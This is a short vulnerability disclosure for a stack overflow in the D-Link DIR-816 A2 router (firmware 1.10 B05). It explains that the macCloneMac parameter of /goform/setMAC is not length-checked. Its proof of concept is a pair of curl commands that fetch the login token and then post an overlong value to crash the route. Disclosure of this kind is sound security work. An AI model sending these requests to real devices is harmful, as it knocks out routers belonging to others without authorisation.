# D-Link DIR-816 A2 Stack Overflow

**Vender** ：D-Link

**Firmware version**:1.10 B05

**Exploit Author**: GD@hillstone

**Vendor Homepage**: http://www.dlink.com.cn/

## detail description

In the handler of route `/goform/setMAC`  the value of parameter macCloneMac is saved on the stack.

However, there's no check on length of the parameter, and a very long input could lead to stack overflow and overwrite the return address。



## POC

first,get the token

`curl -s http://192.168.0.1/dir_login.asp | grep tokenid`

<input type="hidden" name="tokenid"  value="xxxx" >

then,we could send the crafted parameter along with the token to the route:

```
curl -i -X POST http://192.168.0.1/goform/setMAC -d tokenid=1804289383 -
d 'macCloneMac=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

final,the route will crash.